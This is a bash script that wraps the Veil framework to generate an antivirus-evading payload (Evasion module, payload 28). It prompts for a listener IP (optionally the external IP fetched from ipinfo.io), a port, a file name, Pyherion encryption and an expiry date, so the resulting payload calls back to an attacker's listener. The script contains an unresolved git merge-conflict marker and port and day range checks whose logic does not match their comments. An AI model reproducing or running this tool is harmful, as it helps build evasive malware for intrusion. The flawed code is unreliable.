#!/bin/bash

#Navigate to the Programe Directory

<<<<<<< HEAD
cd Veil 2>/dev/null
=======
cd Veil 2>/dev/null 
>>>>>>> 0d0c02918c1777eb0bcb8b0bd61655fb0bb27d44
if ! [ $? -eq 0 ] ;then
  echo "Veil Directory Does not exist!"
else

##Additional code required to determine internet connectivity

case "$(curl -s --max-time 2 -I http://google.com | sed 's/^[^ ]*  *\([0-9]\).*/\1/; 1q')" in
  [23]) echo "HTTP connectivity is up"

#Get External IP Addr. / Set Variable

IP=$(curl ipinfo.io/ip)

##Case Declaration [External IP vs. Internal IP.]
    read -p "Do you want to use your external IP Yy/Nn?" yn

    case $yn in

##[Case 1: External IP]
        [Yy]* )
#Ask for Port Info.
echo "Listening Port?"
read port

#Limit the Input to Integer
if ! [ "$port" -eq "$port" ] 2>/dev/null;then
echo "Integers Only!"
else

#Limit the Port Range to 0 ~ 65535
if ! [ "$port" -le 0 ] ; [ "$port" -gt 65535 ];then
echo "Invalid Port Number!"
else

#Ask for FileName
echo File Name:
read fname

#Check for Empty Input
if [ -z "$fname" ];then
echo "Empty String!"
else

#Ask for Encryption Setting
echo "Encryption (Y/N)?"
read enc

#Check for Empty Input
if [ -z "$enc" ];then
echo "No Argument Supplied!"
else

#Ask for Exp. Date
echo "Payload Expires After X Days"
read exp

#Limit the Input to Integer
if ! [ "$exp" -eq "$exp" ] 2>/dev/null;then
echo "Integers Only!"
else
#Limit the Days Within 365
if ! [ "$exp" -le 0 ] ; [ "$exp" -gt 365 ];then
echo "The Value Must be Within 365 Days due to Ethical Concern!"
else

#Veil Framework Parameters
./Veil.py -t Evasion -p 28 --ip $IP --port $port -o $fname -c USE_PYHERION=$enc EXPIRE_PAYLOAD=$exp
fi
fi
fi
fi
fi
fi
;;

##[Case 2: Internal IP (Custom)]
	[Nn]* )

#Ask for Internal IP Addr.
read -p "Please Enter the Listening IP Addr.?" ip
#Check for Empty Input
if [ -z "$ip" ];then
echo "Please Enter the Listening Addr.!"
else

#Ask for Port Info.
echo Listening Port?
read port

#Limit the Input to Integers
if ! [ "$port" -eq "$port" ] 2>/dev/null;then
echo "Integers Only!"
else

#Limit the Port Range to 0 ~ 65535
if ! [ "$port" -le 0 ] ; [ "$port" -gt 65535 ];then
echo "Invalid Port Number!"
else

#Ask for FileName
echo File Name:
read fname

#Check for Empty Input
if [ -z "$fname" ];then
echo "Empty String!"
else

#Ask for Encryption Setting
echo "Encryption (Y/N)?"
read enc

#Check for Empty Input
if [ -z "$enc" ];then
echo "No Argument Supplied!"
else

#Ask for Exp. Date
echo  "Payload Expires After X Days"
read exp

#Limit the Input to Integers
if ! [ "$exp" -eq "$exp" ] 2>/dev/null;then
echo "Intergers Only!"
else

#Limit the Days Within 365
if ! [ "$exp" -le 0 ] ; [ "$exp" -gt 365 ];then
echo "The Value Must be Within 365 Days due to Ethical Concern!"
else


#Veil Framework Parameters
./Veil.py -t Evasion -p 28 --ip $ip --port $port -o $fname -c USE_PYHERION=$enc EXPIRE_PAYLOAD=$exp
fi
fi
fi
fi
fi
fi
fi
;;

#[Case 3: Not Selected]
* )
		echo "Please Enter Yes or No!";;
esac
;;

#No Internet Connection
  5) echo "The web proxy won't let us through";;
  *) echo "The network is down or very slow";;


esac
fi
